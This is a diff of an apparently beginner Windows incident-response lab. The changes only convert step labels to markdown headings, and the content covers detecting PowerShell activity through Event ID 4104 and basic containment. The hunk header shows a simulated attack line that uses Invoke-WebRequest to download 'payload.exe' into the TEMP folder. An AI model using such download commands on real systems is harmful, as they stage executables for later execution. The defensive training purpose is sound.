@@ -131,24 +131,24 @@ Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payl
 ```
 This mimics downloading a suspicious file.
 
-Step 4: Detect the PowerShell Activity
+### Step 4: Detect the PowerShell Activity
 1. Open Event Viewer.
 2. Navigate to:
 `Applications and Services Logs → Microsoft → Windows → PowerShell → Operational`
 3. Filter by Event ID 4104.
 4. Identify the PowerShell command used.
 
-Step 5: Basic Response Actions
+### Step 5: Basic Response Actions
 - Kill the suspicious process from Task Manager.
 - Delete the file payload.exe from %TEMP%.
 - Take note of timestamps, user account, and command line parameters.
 
-Conclusion:
+## Conclusion:
 - You learned the basic steps of detecting and responding to two common incidents: failed logins and suspicious PowerShell activity.
 - Incident response involves quick detection, containment, and investigation using built-in tools like Event Viewer and PowerShell logs.
 - Even basic Windows environments can generate rich telemetry for incident detection.
 
-Submission:
+## Submission:
 Submit two screenshots:
 - One showing Event ID 4625 for the failed login attempt.
 - One showing PowerShell Event ID 4104 for the download attempt.
